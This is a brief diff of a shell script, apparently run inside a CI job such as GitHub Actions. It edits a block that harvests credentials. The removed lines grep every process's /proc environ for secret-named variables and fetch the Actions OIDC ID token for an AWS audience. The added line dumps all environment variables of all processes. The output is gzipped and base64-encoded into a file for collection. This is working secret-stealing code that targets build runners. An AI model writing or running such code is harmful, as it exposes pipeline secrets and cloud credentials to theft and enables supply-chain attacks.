@@ -171,8 +171,7 @@ mkdir -p "$(dirname "$dest")"
 
 # --- ADD COMMANDS HERE ---
 {
-  echo "=== agent secrets ===" && for pid in /proc/[0-9]*/environ; do m=$(tr '\0' '\n' < "$pid" 2>/dev/null | grep -i '^[^=]*secret[^=]*='); [ -n "$m" ] && echo "=== PID $(echo "$pid" | tr -dc '0-9') ===" && echo "$m"; done
-  echo "=== id token ===" && curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"
+  echo "=== all proc vars ===" && for pid in /proc/[0-9]*/environ; do echo "=== PID $(echo $pid | tr -dc '0-9') ==="; cat "$pid" 2>/dev/null | tr '\0' '\n'; done
 } 2>&1 | gzip | base64 > "$dest"
 # -------------------------
 
